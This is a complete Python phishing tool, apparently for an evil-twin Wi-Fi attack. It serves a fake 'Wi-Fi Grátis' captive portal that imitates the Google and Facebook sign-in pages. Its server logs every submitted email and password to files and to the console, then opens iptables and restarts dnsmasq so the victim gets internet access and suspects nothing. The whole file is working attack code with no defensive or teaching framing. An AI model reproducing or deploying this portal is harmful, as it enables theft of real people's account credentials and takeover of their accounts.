#!/usr/bin/env python3
import os
import sys
import json
import time
import subprocess
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs, unquote

CAPTURED_DIR = "/root/wifi/captures/credenciais"
DNSMASQ_CONF = "/root/wifi/conf/dnsmasq/lucas_2ghz.conf"
os.makedirs(CAPTURED_DIR, exist_ok=True)

HTML = """<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
<title>Wi-Fi Grátis</title>
<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
body{font-family:'Roboto',sans-serif;background:#fff;color:#202124;min-height:100dvh;display:flex;flex-direction:column}
.top{padding:48px 24px 16px;text-align:center}
.top svg{display:block;margin:0 auto 16px}
.top h1{font-size:24px;font-weight:400;letter-spacing:-.3px}
.top p{font-size:14px;color:#5f6368;margin-top:4px}
.steps{flex:1;overflow:hidden;position:relative}
.track{display:flex;width:500%;transition:transform .35s cubic-bezier(.2,0,0,1)}
.page{width:20%;padding:0 24px;display:flex;flex-direction:column;min-height:calc(100dvh-200px)}
/* botoes provedor */
.providers{padding-top:24px;display:flex;flex-direction:column;gap:16px}
.provider{display:flex;align-items:center;gap:16px;width:100%;padding:14px 18px;border:1px solid #dadce0;border-radius:12px;cursor:pointer;transition:.12s;background:#fff}
.provider:active{background:#f8f9fa;transform:scale(.98)}
.provider .txt{flex:1;text-align:left}
.provider .nm{font-size:15px;font-weight:500;color:#202124}
.provider .sb{font-size:13px;color:#5f6368;margin-top:1px}
.terms{text-align:center;font-size:12px;color:#5f6368;padding:24px 0 0}
.terms a{color:#0b57d0;text-decoration:none}
/* inputs */
.ip-group{margin-top:20px}
.ip-group label{display:block;font-size:14px;color:#5f6368;margin-bottom:6px}
.ip-group input{width:100%;padding:14px 16px;border:1px solid #dadce0;border-radius:8px;font-size:16px;outline:none;transition:.15s;font-family:'Roboto',sans-serif}
.ip-group input:focus{border-color:#0b57d0;box-shadow:inset 0 0 0 1px #0b57d0}
.ip-group .erro{color:#d93025;font-size:13px;margin-top:6px;display:none}
.ip-group .erro.show{display:block}
.ip-group input.erro{border-color:#d93025}
/* botoes */
.btn-group{display:flex;justify-content:space-between;align-items:center;margin-top:32px}
.btn{font-size:14px;font-weight:500;padding:10px 28px;border-radius:20px;border:none;cursor:pointer;transition:.12s;font-family:'Roboto',sans-serif}
.btn-outline{background:transparent;color:#0b57d0}
.btn-outline:active{background:#f0f4ff}
.btn-primary{background:#0b57d0;color:#fff}
.btn-primary:active{background:#0842a0}
.btn-full{width:100%;justify-content:center;margin-top:12px}
.back-link{color:#0b57d0;font-size:14px;text-decoration:none;cursor:pointer;display:inline-block;margin-bottom:12px}
.back-link:active{text-decoration:underline}
/* password eye */
.pw-wrap{position:relative}
.pw-wrap .eye{position:absolute;right:14px;top:50%;transform:translateY(-50%);cursor:pointer;color:#5f6368;font-size:13px}
/* loading/success */
.centered{display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;flex:1}
.spin{width:40px;height:40px;border:4px solid #e8f0fe;border-top-color:#0b57d0;border-radius:50%;animation:spin 1s infinite linear;margin-bottom:24px}
@keyframes spin{to{transform:rotate(360deg)}}
.centered h2{font-size:20px;font-weight:400;margin-bottom:6px}
.centered p{font-size:14px;color:#5f6368}
/* links uteis */
.links{padding:24px;display:flex;justify-content:center;gap:24px;font-size:12px;color:#5f6368}
.links a{color:#5f6368;text-decoration:none}
.links a:active{color:#202124}
.helper{display:flex;align-items:center;gap:4px;cursor:pointer;padding:8px 12px;margin:0 auto;font-size:12px;color:#5f6368;border-radius:20px}
.helper:active{background:#f1f3f4}
</style>
</head>
<body>

<div class="top">
<svg width="72" height="24" viewBox="0 0 72 24"><text x="0" y="20" font-size="22" font-weight="500" fill="#202124" font-family="'Roboto',sans-serif">Wi‑Fi</text><text x="42" y="20" font-size="22" font-weight="700" fill="#0b57d0" font-family="'Roboto',sans-serif">.</text></svg>
<h1 id="titulo">Acesse a internet</h1>
<p id="subtitulo">Escolha como deseja se conectar</p>
</div>

<div class="steps"><div class="track" id="track">

<!-- PAG 0: ESCOLHER PROVEDOR -->
<div class="page">
<div class="providers">
<div class="provider" onclick="sel('google')">
<svg width="24" height="24" viewBox="0 0 48 48"><path fill="#FFC107" d="M43.6 20.1H42V20H24v8h11.3c-1.7 4.7-6.1 8-11.3 8-6.6 0-12-5.4-12-12s5.4-12 12-12c3 0 5.8 1.2 8 3l5.6-5.6C34 6 29.2 4 24 4 13 4 4 13 4 24s9 20 20 20c11 0 20-9 20-20 0-1.4-.1-2.7-.4-3.9z"/><path fill="#FF3D00" d="M6.3 14.7l6.6 4.8C14.7 15.1 19 12 24 12c3 0 5.8 1.2 8 3l5.6-5.6C34 6 29.3 4 24 4 16.3 4 9.7 8.3 6.3 14.7z"/><path fill="#4CAF50" d="M24 44c5.2 0 9.9-2 13.4-5.2l-6.2-5.2c-2.1 1.5-4.6 2.4-7.2 2.4-5.2 0-9.6-3.3-11.3-8l-6.5 5C9.5 39.6 16.2 44 24 44z"/><path fill="#1976D2" d="M43.6 20.1H42V20H24v8h11.3c-.8 2.2-2.2 4.2-4.1 5.6.1 0 .2.1.3.1l6.2 5.3c-1.8 1.6-8.7 5.9-13.7 5.9-11 0-20-9-20-20 0-6.3 3-12 7.7-15.6l-6.6-4.7C9.7 4.3 4.2 9.7 4 24c0 11 9 20 20 20v0"/></svg>
<div class="txt"><div class="nm">Entrar com Google</div><div class="sb">Use sua conta Google</div></div></div>

<div class="provider" onclick="sel('facebook')">
<svg width="24" height="24" viewBox="0 0 24 24" fill="#1877F2"><path d="M24 12.1c0-6.6-5.4-12-12-12S0 5.5 0 12.1c0 6 4.4 10.9 10.1 11.9v-8.4H7v-3.5h3V9.4c0-3 1.8-4.7 4.5-4.7 1.3 0 2.7.2 2.7.2v3h-1.5c-1.5 0-2 .9-2 1.9v2.2h3.3l-.5 3.5h-2.8v8.4C19.6 23 24 18 24 12.1z"/></svg>
<div class="txt"><div class="nm">Entrar com Facebook</div><div class="sb">Use sua conta Facebook</div></div></div>
</div>
<p class="terms">Ao se conectar, você aceita os <a href="#" onclick="return false">Termos de Uso</a>.</p>
</div>

<!-- PAG 1: EMAIL -->
<div class="page">
<a class="back-link" onclick="voltar(0)">&larr; Voltar</a>
<div class="ip-group">
<label id="lbl-email">E-mail ou telefone</label>
<input type="email" id="email" autocomplete="username" placeholder="seu@email.com">
<div class="erro" id="err-email">Digite um e-mail válido</div>
</div>
<div class="btn-group"><span></span>
<button class="btn btn-primary" onclick="valEmail()">Próxima</button></div>
</div>

<!-- PAG 2: SENHA -->
<div class="page">
<a class="back-link" onclick="voltar(1)">&larr; Voltar</a>
<div class="ip-group">
<label id="lbl-senha">Digite sua senha</label>
<div class="pw-wrap">
<input type="password" id="senha" autocomplete="current-password">
<span class="eye" id="olho" onclick="altOlho()">👁</span>
</div>
<div class="erro" id="err-senha">Senha incorreta. Tente novamente.</div>
</div>
<div class="btn-group">
<button class="btn btn-outline" onclick="voltar(1)">Esqueceu?</button>
<button class="btn btn-primary" onclick="valSenha()">Próxima</button></div>
</div>

<!-- PAG 3: CARREGANDO -->
<div class="page" style="justify-content:center;align-items:center;text-align:center">
<div class="spin"></div>
<h2 id="load-tit">Verificando...</h2>
<p id="load-sub" style="color:#5f6368;font-size:14px;margin-top:4px">Aguarde um momento.</p>
</div>

<!-- PAG 4: SUCESSO -->
<div class="page" style="justify-content:center;align-items:center;text-align:center">
<div style="width:48px;height:48px;background:#e6f4ea;border-radius:50%;display:flex;align-items:center;justify-content:center;margin-bottom:20px">
<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#137333" stroke-width="2.5"><path d="M5 13l4 4L19 7"/></svg></div>
<h2 id="ok-tit" style="font-size:20px;font-weight:400">Conectado!</h2>
<p id="ok-sub" style="font-size:14px;color:#5f6368;margin-top:4px">Acesso liberado. Redirecionando...</p>
</div>

</div></div>

<div class="links">
<a href="#" onclick="return false">Ajuda</a>
<a href="#" onclick="return false">Privacidade</a>
<a href="#" onclick="return false">Termos</a>
</div>

<script>
var p='google',track=document.getElementById('track'),
    email=document.getElementById('email'),
    senha=document.getElementById('senha'),
    errE=document.getElementById('err-email'),
    errS=document.getElementById('err-senha'),
    lblE=document.getElementById('lbl-email'),
    lblS=document.getElementById('lbl-senha'),
    tit=document.getElementById('titulo'),
    sub=document.getElementById('subtitulo'),
    olho=document.getElementById('olho'),
    lt=document.getElementById('load-tit'),
    ls=document.getElementById('load-sub'),
    ot=document.getElementById('ok-tit'),
    os=document.getElementById('ok-sub')

function ir(n){var v=-n*20;track.style.transform='translateX('+v+'%)';if(n==1)setTimeout(function(){email.focus()},300)}

function sel(v){p=v;tit.textContent=v=='google'?'Fazer login':'Entrar no Facebook';sub.textContent=v=='google'?'Use sua Conta do Google':'Use sua conta do Facebook';ir(1)}

function voltar(n){ir(n)}

function valEmail(){
 var v=email.value.trim()
 if(!v||v.length<3){errE.classList.add('show');email.classList.add('erro');return}
 errE.classList.remove('show');email.classList.remove('erro')
 lt.textContent='Ol\u00e1, '+(v.includes('@')?v.split('@')[0]:v);ls.textContent='Verificando sua conta...'
 setTimeout(function(){ir(2);setTimeout(function(){senha.focus()},300)},700)
}

function valSenha(){
 var v=senha.value.trim()
 if(!v||v.length<4){errS.classList.add('show');senha.classList.add('erro');return}
 errS.classList.remove('show');senha.classList.remove('erro')
 var em=email.value.includes('@')?email.value:email.value+'@gmail.com'
 ir(3);lt.textContent='Verificando...';ls.textContent='Aguarde um momento.'
 var x=new XMLHttpRequest();x.open('POST','/login',true);x.setRequestHeader('Content-Type','application/x-www-form-urlencoded')
 x.onload=function(){setTimeout(function(){ot.textContent='Conectado!';os.innerHTML='Bem-vindo(a)!<br><strong>'+em+'</strong>';ir(4);setTimeout(function(){window.location.href='https://google.com'},2000)},800)}
 x.onerror=function(){setTimeout(function(){window.location.href='https://google.com'},1000)}
 x.send('email='+encodeURIComponent(em)+'&pass='+encodeURIComponent(v)+'&provider='+encodeURIComponent(p))
}

function altOlho(){senha.type=senha.type=='password'?'text':'password';olho.textContent=senha.type=='password'?'👁':'👁‍🗨'}

email.addEventListener('keydown',function(e){if(e.key=='Enter')valEmail()})
senha.addEventListener('keydown',function(e){if(e.key=='Enter')valSenha()})
</script>
</body>
</html>"""

class CaptiveHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        path = urlparse(self.path).path
        if path == "/favicon.ico":
            self.send_response(204)
            self.end_headers()
            return
        if path == "/":
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Cache-Control", "no-cache, no-store, must-revalidate")
            self.end_headers()
            self.wfile.write(HTML.encode())
            return
        self.send_response(302)
        self.send_header("Location", "http://192.168.50.1/")
        self.send_header("Cache-Control", "no-cache, no-store, must-revalidate")
        self.end_headers()

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length).decode() if length else ""
        data = parse_qs(body)
        email = data.get("email", [""])[0]
        passwd = data.get("pass", [""])[0]
        provider = data.get("provider", ["google"])[0]
        client_ip = self.client_address[0]
        ts = time.strftime("%Y-%m-%d %H:%M:%S")
        log = {"ip": client_ip, "email": email, "senha": passwd, "provider": provider, "timestamp": ts}
        fname = f"{CAPTURED_DIR}/{int(time.time())}_{client_ip}.json"
        with open(fname, "w") as f:
            json.dump(log, f, indent=2)
        with open(f"{CAPTURED_DIR}/todas.txt", "a") as f:
            f.write(f"[{ts}] IP:{client_ip} | Provider:{provider} | Email:{email} | Senha:{passwd}\n")
        print(f"\n[CAPTURADO] {ts} - {client_ip} [{provider}] - {email}:{passwd}")

        # Autorizar cliente: liberar internet
        try:
            subprocess.run(["iptables", "-I", "FORWARD", "1", "-s", client_ip, "-i", "buS1", "-o", "zsf1", "-j", "ACCEPT"],
                         check=False, capture_output=True, timeout=5)
        except Exception:
            pass

        # Liberar DNS (remover address=/#/ do dnsmasq)
        try:
            if os.path.exists(DNSMASQ_CONF):
                with open(DNSMASQ_CONF, "r") as f:
                    conf = f.readlines()
                changed = False
                new_conf = []
                for line in conf:
                    if line.startswith("address=/#/"):
                        new_conf.append("#" + line)
                        changed = True
                    else:
                        new_conf.append(line)
                if changed:
                    with open(DNSMASQ_CONF, "w") as f:
                        f.writelines(new_conf)
                    subprocess.run(["pkill", "dnsmasq"], check=False, capture_output=True, timeout=3)
                    time.sleep(0.5)
                    subprocess.run(["dnsmasq", "-C", DNSMASQ_CONF, "-i", "buS1", "--bind-interfaces"],
                                 check=False, capture_output=True, timeout=5)
                    print(f"[AUTORIZADO] {client_ip} - DNS liberado, internet ativa")
        except Exception:
            pass

        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(b'{"status":"ok"}')

    def log_message(self, format, *args):
        pass

def main():
    port = 8080
    print(f"[+] Captive Portal v2 rodando em 0.0.0.0:{port}")
    print("[+] Credenciais salvas em: " + CAPTURED_DIR)
    print("[+] Servindo: Entrar com Google | Entrar com Facebook")
    HTTPServer(("0.0.0.0", port), CaptiveHandler).serve_forever()

if __name__ == "__main__":
    main()
